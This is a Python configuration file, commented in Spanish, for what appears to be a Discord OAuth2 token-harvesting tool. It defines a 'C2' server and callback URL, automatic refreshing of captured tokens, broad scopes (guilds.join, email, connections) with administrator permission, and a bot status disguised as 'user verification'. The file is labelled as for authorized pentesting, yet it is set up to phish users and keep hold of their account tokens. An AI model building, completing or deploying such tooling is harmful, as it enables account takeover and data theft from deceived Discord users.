# config.py
# Configuración centralizada para todo el proyecto
# USO EXCLUSIVO PARA PENTESTING AUTORIZADO

import os
import base64
import secrets

class Config:
    # ========== CREDENCIALES DE LA APP DISCORD ==========
    CLIENT_ID = os.getenv("DISCORD_CLIENT_ID", "TU_CLIENT_ID_AQUI")
    CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET", "TU_CLIENT_SECRET_AQUI")
    BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN", "TU_BOT_TOKEN_AQUI")

    # ========== SERVIDOR C2 ==========
    C2_HOST = os.getenv("C2_HOST", "0.0.0.0")
    C2_PORT = int(os.getenv("C2_PORT", "443"))
    C2_DOMAIN = os.getenv("C2_DOMAIN", "tu-dominio.com")
    CALLBACK_PATH = "/callback"

    @property
    def CALLBACK_URL(self):
        return f"https://{self.C2_DOMAIN}{self.CALLBACK_PATH}"

    # ========== SEGURIDAD ==========
    SECRET_KEY = os.getenv("SECRET_KEY", base64.urlsafe_b64encode(secrets.token_bytes(32)).decode())
    STATE_EXPIRY = 300  # 5 minutos

    # ========== TOKENS ==========
    AUTO_REFRESH_TOKENS = True
    REFRESH_THRESHOLD_HOURS = 24

    # ========== WEBHOOK DE ALERTAS ==========
    ALERT_WEBHOOK_URL = os.getenv("ALERT_WEBHOOK_URL", "")

    # ========== LOGS ==========
    LOG_DIR = "data"
    LOG_LEVEL = "INFO"

    # ========== BOT ==========
    BOT_COMMAND_PREFIX = "!"
    BOT_ACTIVITY = "🔍 Verificación de usuarios"
    ALLOWED_GUILDS = []

    # ========== SCOPE OAUTH2 ==========
    OAUTH_SCOPES = "bot identify guilds guilds.join email connections"
    OAUTH_PERMISSIONS = "8"

    @classmethod
    def to_dict(cls):
        safe = {}
        for k, v in cls.__dict__.items():
            if not k.startswith("_") and k.isupper():
                if "TOKEN" in k or "SECRET" in k or "KEY" in k:
                    v = str(v)[:15] + "..." if v and v != "TU_CLIENT_ID_AQUI" else v
                safe[k] = v
        return safe

    @classmethod
    def validate(cls):
        missing = []
        if cls.CLIENT_ID == "TU_CLIENT_ID_AQUI":
            missing.append("CLIENT_ID")
        if cls.CLIENT_SECRET == "TU_CLIENT_SECRET_AQUI":
            missing.append("CLIENT_SECRET")
        if cls.BOT_TOKEN == "TU_BOT_TOKEN_AQUI":
            missing.append("BOT_TOKEN")
        if cls.C2_DOMAIN == "tu-dominio.com":
            missing.append("C2_DOMAIN")
        return missing

config = Config()
